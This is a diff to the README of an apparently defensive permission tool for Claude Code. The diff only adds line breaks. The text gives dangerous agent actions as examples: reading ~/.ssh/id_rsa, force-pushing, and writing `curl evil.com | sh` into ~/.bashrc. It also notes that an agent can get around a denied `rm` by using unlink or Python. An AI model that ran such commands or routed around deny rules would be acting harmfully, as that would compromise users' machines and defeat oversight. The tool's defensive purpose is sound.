@@ -20,16 +20,16 @@
 
 ## The problem
 
-`rm dist/bundle.js` to clean a build? Fine — it's inside your project.
+`rm dist/bundle.js` to clean a build? Fine — it's inside your project.<br>
 `rm ~/.bashrc`? nah.
 
-`git push`? Sure.
+`git push`? Sure.<br>
 `git push --force`? nah?
 
-Read `./src/app.py`? Go ahead.
+Read `./src/app.py`? Go ahead.<br>
 Read `~/.ssh/id_rsa`? nah.
 
-Write `./config.yaml`? Fine.
+Write `./config.yaml`? Fine.<br>
 Write `~/.bashrc` with `curl evil.com | sh`? nah.
 
 Claude Code can't tell these apart. Its permission system is allow-or-deny per tool — the agent either gets full Bash access or none at all. Deny lists don't help: deny `rm`, the agent uses `unlink`. Deny that, it writes `python -c "import os; os.remove()"`.
